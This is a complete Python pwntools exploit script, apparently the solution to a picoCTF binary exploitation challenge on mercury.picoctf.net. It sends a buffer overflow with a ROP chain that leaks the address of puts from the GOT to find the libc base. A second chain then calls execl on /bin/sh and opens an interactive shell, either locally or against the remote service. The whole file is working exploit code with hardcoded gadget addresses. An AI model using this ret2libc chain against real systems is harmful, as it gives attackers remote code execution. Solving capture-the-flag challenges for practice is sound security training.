#!/usr/bin/env python3
from pwn import *
import sys, pwnlib

pwnlib.args.SILENT(True)

bin_path = "./vuln_patched"
libc_path = "./libc.so.6"
host = "mercury.picoctf.net"
port = 42072

def main(argc, argv):
	rw_addr = 0x601110
	puts_gotplt = 0x601018

	redo = 0x4006d8
	main_puts = 0x400891
	ret_puts = 0x400769
	pop_rdi = 0x400913
	pop_rsi_r15 = 0x400911

	mov_rax_1 = 0xd0e90
	sub_rax_1 = 0xbb283
	mov_rdx_rax = 0x1417ad

	modes = ['local', 'remote']
	if(argc < 2):
		return 0
	mode = argv[1].lower()
	if(mode not in modes):
		return 0

	libc = ELF(libc_path)
	puts_off = libc.symbols['puts']
	execl_off = libc.symbols['execl']
	cmd_off = 0x001b40fa

	p = process(bin_path) if mode == modes[0] else remote(host, port)
	death = p.kill if mode == modes[0] else p.close

	p.recvline()
	
	leak_libc = b'A'*0x80
	leak_libc += p64(rw_addr)
	leak_libc += p64(pop_rdi)
	leak_libc += p64(puts_gotplt)
	leak_libc += p64(main_puts)

	p.sendline(leak_libc)
	p.recvline()
	packed_leak = p.recvline()[:-1]
	packed_leak += b'\x00'*(8-len(packed_leak))
	leak = u64(packed_leak)
	print(f"Leaked address 0x{leak:x}")
	libc_base = leak-puts_off
	print(f"Libc base address: 0x{libc_base:x}")

	execl = libc_base+execl_off
	bin_sh = libc_base+cmd_off

	print("Calling execl()...")
	call_execl = b'A'*0x80
	call_execl += p64(rw_addr)
	call_execl += p64(pop_rdi)
	call_execl += p64(bin_sh)
	call_execl += p64(pop_rsi_r15)
	call_execl += p64(bin_sh+5)
	call_execl += p64(0)
	call_execl += p64(libc_base+mov_rax_1)
	call_execl += p64(libc_base+sub_rax_1)
	call_execl += p64(libc_base+mov_rdx_rax)
	call_execl += p64(execl)

	p.sendline(call_execl)
	p.recv()

	p.interactive()

	return 0

if(__name__=="__main__"):
	try:
		exit(main(len(sys.argv), sys.argv))
	except KeyboardInterrupt:
		exit(130)
